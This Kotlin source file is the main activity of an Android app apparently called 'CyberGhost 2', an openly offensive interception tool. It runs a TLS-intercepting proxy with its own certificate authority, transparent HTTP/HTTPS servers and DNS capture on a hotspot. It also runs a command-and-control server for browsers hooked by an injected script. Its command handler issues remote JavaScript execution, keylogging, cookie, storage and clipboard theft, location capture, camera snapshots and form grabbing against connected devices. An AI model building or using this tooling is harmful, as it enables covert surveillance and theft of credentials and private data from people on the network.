package com.cyberghost

import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.runtime.*
import androidx.core.app.NotificationCompat
import com.cyberghost.core.*
import com.cyberghost.ui.*
import kotlinx.coroutines.launch
import android.content.Intent
import android.net.Uri
import androidx.core.content.FileProvider
import java.io.File

class MainActivity : ComponentActivity() {

    private var certManager: CertManager? = null
    private var deviceManager: DeviceManager? = null
    private var contentInjector: ContentInjector? = null
    private var proxy: InterceptProxy? = null
    private var c2Server: WebSocketC2Server? = null
    private var mediaServer: MediaServer? = null
    private var dnsCapture: DnsCapture? = null
    private var transparentHttp: TransparentHttpServer? = null
    private var transparentHttps: TransparentHttpsServer? = null
    private var hookJs: String = ""
    private val trafficStats = TrafficStats()
    private val networkMapper = NetworkMapper()
    private val certViewer = SslCertViewer()
    private lateinit var profileManager: ProfileManager
    private lateinit var packetExporter: PacketExporter
    private val certInfoCache = mutableMapOf<String, CertInfo>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.i("CG2", "MainActivity onCreate")

        profileManager = ProfileManager(this)
        packetExporter = PacketExporter(this)
        createNotificationChannel()

        try { hookJs = assets.open("hook.js").bufferedReader().readText() }
        catch (e: Exception) { Log.e("CG2", "hook.js load failed", e); hookJs = "// failed" }

        setContent {
            CyberGhostTheme {
                val packets = remember { mutableStateListOf<InterceptedPacket>() }
                val interceptQueue = remember { mutableStateListOf<PendingIntercept>() }
                val devices = remember { mutableStateListOf<ConnectedDevice>() }
                val events = remember { mutableStateListOf<C2Event>() }
                var isRunning by remember { mutableStateOf(false) }
                var mode by remember { mutableStateOf(InterceptMode.PASSTHROUGH) }
                var config by remember { mutableStateOf(InjectionConfig()) }
                var hookedSessions by remember { mutableStateOf<List<HookedSession>>(emptyList()) }
                val networkHosts by networkMapper.hosts.collectAsState()
                val isScanning by networkMapper.scanning.collectAsState()
                var profiles by remember { mutableStateOf(profileManager.list()) }
                var certInfos by remember { mutableStateOf<Map<String, CertInfo>>(emptyMap()) }

                LaunchedEffect(isRunning) {
                    if (isRunning) {
                        try {
                            if (certManager == null) certManager = CertManager(filesDir)
                            if (deviceManager == null) deviceManager = DeviceManager()
                            if (contentInjector == null) contentInjector = ContentInjector()
                            contentInjector?.config = config

                            proxy = InterceptProxy(8080, certManager!!, contentInjector!!).also { p ->
                                p.mode = mode; p.start()
                                launch {
                                    p.packets.collect { pkt ->
                                        packets.add(pkt); if (packets.size > 2000) packets.removeAt(0)
                                        deviceManager?.trackRequest(pkt.sourceIp, pkt.headers["User-Agent"], pkt.body.size.toLong())
                                        trafficStats.recordPacket(pkt)
                                    }
                                }
                            }
                            transparentHttp = TransparentHttpServer(80, proxy!!, contentInjector!!).also { it.start() }
                            transparentHttps = TransparentHttpsServer(443, proxy!!, certManager!!, contentInjector!!).also { it.start() }
                            mediaServer = MediaServer(9090, this@MainActivity, hookJs).also { it.start() }
                            c2Server = WebSocketC2Server(9091, deviceManager!!).also { c2 ->
                                c2.start()
                                launch { c2.events.collect { event -> events.add(event); if (events.size > 500) events.removeAt(0) } }
                            }
                            dnsCapture = DnsCapture(5353, gatewayIp = "192.168.43.1", transparentMode = true).also { dns ->
                                dns.start()
                                launch { dns.queries.collect { trafficStats.recordDns() } }
                            }
                            launch {
                                while (true) {
                                    kotlinx.coroutines.delay(500)
                                    deviceManager?.let { dm -> devices.clear(); devices.addAll(dm.getAllDevices()); hookedSessions = dm.getHookedSessions() }
                                    updateNotification(devices.size, hookedSessions.count { it.isAlive }, trafficStats.totalPackets.get())
                                }
                            }
                            showNotification("Engines started")
                            Log.i("CG2", "All engines started")
                        } catch (e: Exception) {
                            Log.e("CG2", "Start failed", e); isRunning = false
                        }
                    } else {
                        proxy?.stop(); proxy = null; transparentHttp?.stop(); transparentHttp = null
                        transparentHttps?.stop(); transparentHttps = null; c2Server?.stop(); c2Server = null
                        mediaServer?.stop(); mediaServer = null; dnsCapture?.stop(); dnsCapture = null
                        cancelNotification()
                    }
                }

                LaunchedEffect(mode) { proxy?.mode = mode }
                LaunchedEffect(config) { contentInjector?.config = config }
                LaunchedEffect(isRunning) {
                    if (isRunning) { launch { while (true) { kotlinx.coroutines.delay(200); interceptQueue.clear(); interceptQueue.addAll(proxy?.interceptQueue?.toList() ?: emptyList()) } } }
                }

                CyberGhostApp(
                    interceptQueue = interceptQueue, packets = packets, devices = devices,
                    hookedSessions = hookedSessions, mode = mode, isRunning = isRunning,
                    events = events, networkHosts = networkHosts, isScanning = isScanning,
                    trafficStats = trafficStats, profiles = profiles, certInfos = certInfos,
                    onModeChange = { mode = it }, onToggle = { isRunning = !isRunning },
                    onForward = { id, pkt -> proxy?.forwardPacket(id, pkt) },
                    onDrop = { id -> proxy?.dropPacket(id) },
                    onCommand = { session, action, params ->
                        when (action) {
                            "exec_js" -> c2Server?.execJs(session, params["code"] as? String ?: "")
                            "screenshot" -> c2Server?.screenshot(session)
                            "keylog_start" -> c2Server?.startKeylog(session)
                            "keylog_stop" -> c2Server?.stopKeylog(session)
                            "get_cookies" -> c2Server?.getCookies(session)
                            "get_storage" -> c2Server?.getStorage(session)
                            "get_clipboard" -> c2Server?.getClipboard(session)
                            "get_location" -> c2Server?.getLocation(session)
                            "camera_snap" -> c2Server?.cameraSnap(session)
                            "form_grab" -> c2Server?.grabForms(session)
                            "get_dom" -> c2Server?.getDom(session)
                        }
                    },
                    onExportCa = { exportCa() },
                    onExportHar = { val file = packetExporter.exportHar(packets.toList()); file?.let { packetExporter.shareFile(it) } },
                    onConfigUpdate = { config = it },
                    onScanNetwork = { networkMapper.scan() },
                    onSaveProfile = { name -> profileManager.save(name, config); profiles = profileManager.list() },
                    onLoadProfile = { name -> profileManager.load(name)?.let { config = it } },
                    onDeleteProfile = { name -> profileManager.delete(name); profiles = profileManager.list() },
                    onSetNickname = { ip, name -> deviceManager?.getDevice(ip)?.hostname = name },
                    onInspectCert = { host ->
                        kotlinx.coroutines.MainScope().launch {
                            val info = certViewer.inspect(host)
                            info?.let { certInfoCache[host] = it; certInfos = certInfoCache.toMap() }
                        }
                    }
                )
            }
        }
    }

    private fun exportCa() {
        try {
            val pem = certManager?.getCaCertPem() ?: return
            val file = File(cacheDir, "cyberghost_ca.crt"); file.writeText(pem)
            val uri: Uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
            startActivity(Intent.createChooser(Intent(Intent.ACTION_SEND).apply {
                type = "application/x-x509-ca-cert"; putExtra(Intent.EXTRA_STREAM, uri); addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }, "Export CyberGhost CA"))
        } catch (e: Exception) { Log.e("CG2", "CA export failed", e) }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel("cg2_status", "CyberGhost Status", NotificationManager.IMPORTANCE_LOW).apply { setShowBadge(false) }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    private fun showNotification(text: String) {
        val n = NotificationCompat.Builder(this, "cg2_status").setContentTitle("CyberGhost 2").setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build()
        getSystemService(NotificationManager::class.java).notify(1337, n)
    }

    private fun updateNotification(devices: Int, hooked: Int, packets: Long) {
        showNotification("D:$devices H:$hooked P:$packets")
    }

    private fun cancelNotification() {
        getSystemService(NotificationManager::class.java).cancel(1337)
    }

    override fun onDestroy() {
        proxy?.stop(); transparentHttp?.stop(); transparentHttps?.stop()
        c2Server?.stop(); mediaServer?.stop(); dnsCapture?.stop()
        cancelNotification(); super.onDestroy()
    }
}
